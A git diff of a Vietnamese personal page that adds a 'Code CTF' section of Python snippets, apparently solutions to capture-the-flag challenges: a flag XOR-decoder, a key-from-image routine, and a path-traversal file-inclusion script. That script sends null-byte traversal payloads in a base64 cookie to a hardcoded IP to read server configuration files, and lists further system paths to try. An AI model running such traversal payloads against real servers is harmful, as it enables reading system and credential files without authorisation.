@@ -32,7 +32,7 @@ coverY: 0
 
 Web nhà làm với tiêu chí : tự học - tự làm - tự hưởng ( bởi vì web như cak ) =]]
 
-```
+```html
 <!DOCTYPE html>
 <html lang="en">
   <head>
@@ -230,7 +230,7 @@ Web nhà làm với tiêu chí : tự học - tự làm - tự hưởng ( bởi 
 </html>
 ```
 
-```
+```html
 <html>
   <head>
     <title> WELLCOME </title>
@@ -277,6 +277,99 @@ Web nhà làm với tiêu chí : tự học - tự làm - tự hưởng ( bởi 
     </body>
     </html>
 
+```
+
+Code CTF
+
+```python
+#!/usr/bin/env python3
+
+import sys
+# import this
+
+if sys.version_info.major == 2:
+    print("You are running Python 2, which is no longer supported. Please update to Python 3.")
+
+ords = [81, 64, 75, 66, 70, 93, 73, 72, 1, 92, 109, 2, 84, 109, 66, 75, 70, 90, 2, 92, 79]
+
+print("Here is your flag:")
+print("".join(chr(o ^ 0x32) for o in ords))
+```
+
+```python
+#!/usr/bin/env python2
+# -*- coding: utf-8 -*-
+import base64
+import requests
+import itertools
+import string
+import sys
+
+reload(sys)
+sys.setdefaultencoding("gb2312")
+
+url = 'http://104.224.169.128:801/tasks/fileinc1.php?file=2'
+#/etc/httpd/conf/httpd.conf
+#/etc/httpd/logs/foo.log,/usr/share/nginx/html/tasks/httpd.conf,/etc/apache2/httpd.conf,/etc/init.d/httpd.conf,/etc/sysconfig/httpd,/usr/local/apache/conf/httpd.conf,/etc/apache/httpd.conf
+#/var/lib/dav/lockdb
+pwd = '/etc/httpd/conf/httpd.conf'
+
+a = '../../../../..'
+b = '\0'
+
+def foo(x):
+	headers = {'cookie':'custom_info='+base64.b64encode(x)}
+	r = requests.get(url=url,headers=headers)
+	if len(r.content) != 503 and "Wrong" not in r.content:
+		return r.content
+	else:
+		return 0
+
+
+c = '/etc/init.d/httpd'
+for i in pwd.split(','):
+	print a+i+b
+	res = foo(a+i+b)
+	if res:
+		f = open('key','wb')
+		f.write(res)
+		print 'done!!!!!'
+		break
+'''
+url2 = 'http://8a4ee40e819d49679370d7106362dfc7a6f3e69777cd4cd7.ctf.game/js/'
+#f = open('dic.txt','wb')
+def foo2():
+	for x in itertools.combinations_with_replacement('0123456789abcdef', 3):
+		#for y in range(1000):
+			a = ''.join(x) + '=attack&' #+ '.js'
+			f.write(a)
+			# r = requests.get(url=url2+a)
+			# print a,r.content
+			# if "404 Not Found" not in r.content:
+			# 	print r.content
+			# 	return 0
+# foo2()
+'''
+```
+
+```python
+fkey = 'Tr43Fla92Ch4n93'
+pic = open('src.jpg','rb').read()
+print pic[:50]
+key = ''
+
+for i in range(len(fkey)):
+	if i == 4:
+		print ord(fkey[i])
+		print pic[ord(fkey[i])]
+		print ord(pic[ord(fkey[i])])
+	v12 = ord(pic[ord(fkey[i])]) % 10
+	if i % 2 == 1:
+		key += chr(ord(fkey[i])+v12)
+	else:
+		key += chr(ord(fkey[i])-v12)
+
+print key
 ```
 
 #### Một số sở thích :
